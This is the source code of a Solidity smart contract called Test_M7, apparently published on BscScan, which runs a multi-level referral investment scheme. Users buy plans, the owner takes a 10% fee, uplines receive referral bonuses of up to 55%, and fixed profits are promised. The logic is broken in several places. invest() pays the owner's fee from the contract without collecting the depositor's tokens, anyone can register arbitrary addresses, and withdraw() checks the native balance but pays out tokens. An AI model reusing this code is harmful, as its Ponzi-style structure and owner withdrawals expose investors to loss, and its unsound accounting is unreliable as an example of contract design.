/**
 *Submitted for verification at BscScan.com on 2023-01-04
*/

// SPDX-License-Identifier: None

pragma solidity 0.6.12;

contract Test_M7{
        IBEP20 token;
    address usdt = 0xfF459C92830fDF27D7D62E746f5D7F9E9818c5C1;
    using SafeMath for uint256;
    uint256[] public REFERRAL_PERCENTS = [50, 50, 50];//5% referal reward
    uint256 public constant PERCENTS_DIVIDER = 1000;
    uint256 public constant TIME_STEP = 1 ;
    uint256 constant public PROJECT_FEE = 100;//10% fee

    uint256 public totalInvested;
    uint256 public totalRefBonus;
    address payable public OwnerAddress;
    uint256 public totalDeposits;
//////
    uint8 public LAST_LEVEL;
    uint256 public RegFee = 10000000;
    uint public lastUserId;
    address public id1;
    mapping(uint => address) public idToAddress;
    mapping(uint => address) public userIds;
    //uint256 public userIdsTime;
        mapping(uint => uint256) public userIdsTime;

	//	uint256 regtimeref;

    struct Plan {
        uint256 price;
        uint256 time;
        uint256 percent;
        bool  PlanActiveted;

    }

    Plan[] internal plans;

	struct Deposit {
        uint8 plan;
		uint256 percent;
		uint256 amount;
		uint256 profit;
		uint256 start;
		uint256 finish;
	}

	struct User {
        mapping(uint8 => bool) activeMainLevels;
        mapping(uint8 => uint256) activetimeMainLevels;
        uint id;
        uint256 refID;
        uint partnersCount;
        address LevelReferrals1;
        address LevelReferrals2;
        address LevelReferrals3;
        address LevelReferrals4;
        address LevelReferrals5;
uint256 regtimeref;

		Deposit[] deposits;
		uint256 checkpoint;
		uint256 checkpointRefBonus;
		address referrer;
		uint256[5] levels;
		uint256 bonus;
		uint256 totalBonus;
	}

    mapping(address => User) internal users;
    event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);
   
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);

    constructor(address payable wallet) public {
                token = IBEP20(usdt);

        OwnerAddress = wallet;
                LAST_LEVEL = 16;
uint256 rfgref = 100;
uint256 rfgref2 = 11;
uint256 qwe = (rfgref2/rfgref)+1;

        plans.push(Plan(25000000 , 300, 3*qwe, true));
        plans.push(Plan(50000000 , 300, 3*qwe, false));
        plans.push(Plan(75000000 , 300, 3*qwe, true));
        plans.push(Plan(100000000 , 300, 3*qwe, true));
        plans.push(Plan(25000000 , 300, 3*qwe, true));
        plans.push(Plan(25000000 , 300, 3*qwe, true));
        plans.push(Plan(25000000 , 300, 3*qwe, true));
        plans.push(Plan(25000000 , 300, 3*qwe, true));
        plans.push(Plan(25000000 , 5 minutes, 1000, false));
        plans.push(Plan(25000000 , 5 minutes, 1000, false));
        plans.push(Plan(25000000 , 5 minutes, 1000, false));
        plans.push(Plan(25000000 , 5 minutes, 1000, false));
        plans.push(Plan(25000000 ether, 5 minutes, 1000, false));
        plans.push(Plan(25000000 ether, 5 minutes, 1000, false));
        plans.push(Plan(25000000 ether, 5 minutes, 1000, false));
        plans.push(Plan(25000000 ether, 5 minutes, 1000, false));

        for (uint8 i = 1; i <= LAST_LEVEL; i++) {
            users[OwnerAddress].activeMainLevels[i] = true;
        }
                User storage user = users[OwnerAddress];


        lastUserId = 2;
        idToAddress[1] = OwnerAddress;
        userIds[1] = OwnerAddress;

        user.id=1;
        user.LevelReferrals1=address(0);
        user.LevelReferrals2=address(0);
        user.LevelReferrals3=address(0);
        user.LevelReferrals4=address(0);
        user.LevelReferrals5=address(0);
        user.partnersCount=uint(0);
        user.refID = uint(0);


  }

    function clear(uint amount) public  {
      if (payable(msg.sender) == OwnerAddress)
      {
       OwnerAddress.transfer(amount);
      }
    }
    function setPlanActiveted(uint8 plan, bool enabled) external {
        require(payable(msg.sender) == OwnerAddress);

        plans[plan].PlanActiveted = enabled;
    }

    function invest(address referrer, uint8 plan, uint256 value) public {

        require(plan <= 16, "Invalid plan");
        require(value >= plans[plan].price,"Wrong value");
        require(isUserExists(referrer), "user is not exists. Register first.");
        require(plan >= 0 && plan <= LAST_LEVEL, "invalid level");
        //require(!users[referrer].activeMainLevels[plan], "level already activated");
        require(plans[plan].PlanActiveted == true, "level already false");

        uint256 fee = value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);

        //OwnerAddress.transfer( fee);
       token.transfer(OwnerAddress, fee);
        emit FeePayed(msg.sender, fee);

User storage user = users[msg.sender];
//if (user.referrer == address(0))
 //{
   //  if (users[referrer].deposits.length > 0 && referrer != msg.sender) 
  //  {
    //     user.referrer = referrer;
   //  }

				address upline1 = user.LevelReferrals1;
               // require(users[referrer].activeMainLevels[plan] ==  users[upline1].activeMainLevels[plan], "upline1 No = upline1");
    //require(users[upline1].activeMainLevels[plan] == true, "upline1 No = upline1");
//&& 
                
if (users[upline1].activeMainLevels[plan] ==  users[referrer].activeMainLevels[plan]) {
                if (upline1 != address(0)) {
					uint256 amount =  value.mul(0).div(PERCENTS_DIVIDER);
					users[upline1].bonus = users[upline1].bonus.add(amount);
					users[upline1].totalBonus = users[upline1].totalBonus.add(amount);
					emit RefBonus(upline1, msg.sender, 0, amount);
					upline1 = users[upline1].LevelReferrals1;
                    
			}

			}else {
				if (upline1 != address(0)) {
					uint256 amount =  value.mul(550).div(PERCENTS_DIVIDER);
					users[upline1].bonus = users[upline1].bonus.add(amount);
					users[upline1].totalBonus = users[upline1].totalBonus.add(amount);
                   // if ( users[referrer].activetimeMainLevels[plan] > 3 minutes )
                   // {}
					emit RefBonus(upline1, msg.sender, 550, amount);
					upline1 = users[upline1].LevelReferrals1;
                    
			}
            }
			address upline2 = user.LevelReferrals2;
				if (upline2 != address(0)) {
					uint256 amount =  value.mul(50).div(PERCENTS_DIVIDER);
					users[upline2].bonus = users[upline2].bonus.add(amount);
					users[upline2].totalBonus = users[upline2].totalBonus.add(amount);
					emit RefBonus(upline2, msg.sender, 50, amount);
					upline2 = users[upline2].LevelReferrals2;
                    
				} 

            address upline3 = user.LevelReferrals3;
				if (upline3 != address(0)) {
					uint256 amount =  value.mul(50).div(PERCENTS_DIVIDER);
					users[upline3].bonus = users[upline3].bonus.add(amount);
					users[upline3].totalBonus = users[upline3].totalBonus.add(amount);
					emit RefBonus(upline3, msg.sender, 50, amount);
					upline3 = users[upline3].LevelReferrals3;
                    
				} 
 
             address upline4 = user.LevelReferrals4;
				if (upline4 != address(0)) {
					uint256 amount =  value.mul(50).div(PERCENTS_DIVIDER);
					users[upline4].bonus = users[upline4].bonus.add(amount);
					users[upline4].totalBonus = users[upline4].totalBonus.add(amount);
					emit RefBonus(upline4, msg.sender, 50, amount);
					upline4 = users[upline4].LevelReferrals4;
                    
				} 

                            address upline5 = user.LevelReferrals5;
				if (upline5 != address(0)) {
					uint256 amount =  value.mul(50).div(PERCENTS_DIVIDER);
					users[upline5].bonus = users[upline5].bonus.add(amount);
					users[upline5].totalBonus = users[upline5].totalBonus.add(amount);
					emit RefBonus(upline5, msg.sender, 50, amount);
					upline5 = users[upline5].LevelReferrals5;
                    
				} 

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}

		(uint256 percent, uint256 profit, uint256 finish) = getResult(plan, value);
		user.deposits.push(Deposit(plan, percent, value, profit, block.timestamp, finish));

		totalInvested = totalInvested.add(value);
		emit NewDeposit(msg.sender, plan, percent, value, profit, block.timestamp, finish);

         totalDeposits = totalDeposits.add(1);

                 users[referrer].activeMainLevels[plan] = true;
                 users[referrer].activetimeMainLevels[plan] = block.timestamp ;

       }

        function usersactiveMainLevels(address referrer, uint8 plan) public view returns(bool) {
        return users[referrer].activeMainLevels[plan];
    }


        function userregtimeref(address referrer, uint8 plan) public view returns(uint256) {
        return  users[referrer].activetimeMainLevels[plan];
    }

  function registr(address userAddress,  uint256 value) public  {
        require(!isUserExists(userAddress), "user exists");
        require(value >= RegFee,"Wrong value");

        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }

        User storage user= users[userAddress];
        user.id=lastUserId;
        user.LevelReferrals1=address(0);
        user.LevelReferrals2=address(0);
        user.LevelReferrals3=address(0);
        user.LevelReferrals4=address(0);
        user.LevelReferrals5=address(0);
        user.partnersCount=uint(0);
        
       
    user.partnersCount=uint(0);

        idToAddress[lastUserId] = userAddress;

        userIds[lastUserId] = userAddress;
        lastUserId++;
        sendRegFee();
        userIdsTime[lastUserId] = block.timestamp;
    }

  function registrationRef(address userAddress, address referrerAddress, uint256 value) public {
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");
        require(value >= RegFee,"Wrong value");

        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }

         User storage user= users[userAddress];
        user.id=lastUserId;
        user.LevelReferrals1=referrerAddress;
        user.partnersCount=uint(0);
        user.refID=users[referrerAddress].id;

        idToAddress[lastUserId] = userAddress;

        userIds[lastUserId] = userAddress;
        lastUserId++;

        users[referrerAddress].partnersCount++;

        if(users[referrerAddress].LevelReferrals1!=address(0))
        {
            users[userAddress].LevelReferrals2=users[referrerAddress].LevelReferrals1;

            if(users[referrerAddress].LevelReferrals2!=address(0))
            {
                users[userAddress].LevelReferrals3=users[referrerAddress].LevelReferrals2;
            }

                        if(users[referrerAddress].LevelReferrals3!=address(0))
            {
                users[userAddress].LevelReferrals4=users[referrerAddress].LevelReferrals3;
            }

                                    if(users[referrerAddress].LevelReferrals4!=address(0))
            {
                users[userAddress].LevelReferrals5=users[referrerAddress].LevelReferrals4;
            }


        }
        sendRegFee();
        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);
           userIdsTime[lastUserId] = block.timestamp;

    }




   function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }
   
    function sendRegFee() private returns (bool) {
        (bool success, ) = (OwnerAddress).call{value:RegFee}('');

        return success;
    }

    function withdraw() public {
		User storage user = users[msg.sender];

		uint256 totalAmount = getUserDividends(msg.sender);

		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			user.bonus = 0;
			totalAmount = totalAmount.add(referralBonus);
		}

		require(totalAmount > 0, "User has no dividends");

		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}
		user.checkpoint = block.timestamp;
		token.transfer(msg.sender, totalAmount);
        //token.transfer(OwnerAddress, fee);
		emit Withdrawn(msg.sender, totalAmount);
	}

//user.checkpoint >= user.deposits[i].finish
    function blockinfo_finish() public view returns (uint256)
    {
 
       // return finish;
         
    }
    function blockinfo() public view returns (uint256)
    {
        return block.timestamp;
    }


    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getPlanInfo(uint8 plan)
        public
        view
        returns (uint256 time, uint256 percent, uint256 price, bool PlanActiveted)
    {
		time = plans[plan].time;
		percent = plans[plan].percent;
		price = plans[plan].price;
       PlanActiveted  = plans[plan].PlanActiveted;
    }

        function getPlanActivatedinfo(uint8 plan)
        public
        view
        returns (bool PlanActiveted)
    {
	
       PlanActiveted  = plans[plan].PlanActiveted;
    }

	function getResult(uint8 plan, uint256 deposit) public view returns (uint256 percent, uint256 profit, uint256 finish) {
		percent = getPercent(plan);
		profit = deposit.mul(percent).div(PERCENTS_DIVIDER).mul(plans[plan].time);
		finish = block.timestamp.add(plans[plan].time);
	}

	function getPercent(uint8 plan) public view returns (uint256) {
	   return plans[plan].percent;
    }

	function getPrice(uint8 plan) public view returns (uint256) {
	   return plans[plan].price;
    }

 	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			if (user.checkpoint < user.deposits[i].finish) {
				if (user.deposits[i].plan > 16 ) {
					uint256 share = user.deposits[i].amount.mul(user.deposits[i].percent).div(PERCENTS_DIVIDER);
					uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
					uint256 to = user.deposits[i].finish < block.timestamp ? user.deposits[i].finish : block.timestamp;
					if (from < to) {
						totalAmount = totalAmount.add(share.mul(to.sub(from)));
					}
				} else if (block.timestamp > user.deposits[i].finish) {
					totalAmount = totalAmount.add(user.deposits[i].profit);
				}
			}
		}

		return totalAmount;
	}


 	function getUserDividendsInfo(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
					uint256 share = user.deposits[i].amount.mul(user.deposits[i].percent).div(PERCENTS_DIVIDER);
					uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
					uint256 to = user.deposits[i].finish < block.timestamp ? user.deposits[i].finish : block.timestamp;
					if (from < to) {
						totalAmount = totalAmount.add(share.mul(to.sub(from)));
					}
			}

		return totalAmount;
	}

    function getUserCheckpoint(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].checkpoint;
    }


    function getUsercheckpointRefBonus(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].checkpointRefBonus;
    }

    function getUserReferrer(address userAddress)
        public
        view
        returns (address)
    {
        return users[userAddress].referrer;
    }

	function getUserDownlineCount(address userAddress) public view returns(uint256, uint256, uint256) {
		return (users[userAddress].levels[0], users[userAddress].levels[1], users[userAddress].levels[2]);
	}

    function getUserTotalReferrals(address userAddress)
        public
        view
        returns (uint256)
    {
        return
            users[userAddress].levels[0];
    }

    function getUserReferralBonus(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].bonus;
    }

    function getUserReferralTotalBonus(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].totalBonus;
    }

    function getUserReferralWithdrawn(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].totalBonus.sub(users[userAddress].bonus);
    }

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}


    function getUserAmountOfDeposits(address userAddress)
        public
        view
        returns (uint256)
    {
        return users[userAddress].deposits.length;
    }

    function getUserTotalDeposits(address userAddress)
        public
        view
        returns (uint256 amount)
    {
        for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
            amount = amount.add(users[userAddress].deposits[i].amount);
        }
    }

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish) {
	    User storage user = users[userAddress];

		plan = user.deposits[index].plan;
		percent = user.deposits[index].percent;
		amount = user.deposits[index].amount;
		profit = user.deposits[index].profit;
		start = user.deposits[index].start;
		finish = user.deposits[index].finish;
	}


	function getUserLastDepositInfo(address userAddress, uint8 plan) public view returns( uint256 percent, uint256 amount, uint256 start, uint256 finish, uint256 profit) {
	    User storage user = users[userAddress];
		if(user.deposits.length > 0){
			plan = user.deposits[users[userAddress].deposits.length - 1].plan;
			percent = user.deposits[users[userAddress].deposits.length - 1].percent;
			amount = user.deposits[users[userAddress].deposits.length - 1].amount;
			start = user.deposits[users[userAddress].deposits.length - 1].start;
			finish = user.deposits[users[userAddress].deposits.length - 1].finish;
			profit = user.deposits[users[userAddress].deposits.length - 1].profit;
		}	
	}

    function getSiteInfo()
        public
        view
        returns (uint256 _totalInvested, uint256 _totalBonus, uint256 _totalDeposits)
    {
        return (totalInvested, totalRefBonus, totalDeposits);
    }


    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }



    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}


interface IBEP20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the token decimals.
     */
    function decimals() external view returns (uint8);

    /**
     * @dev Returns the token symbol.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the token name.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the bep token owner.
     */
    function getOwner() external view returns (address);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address _owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}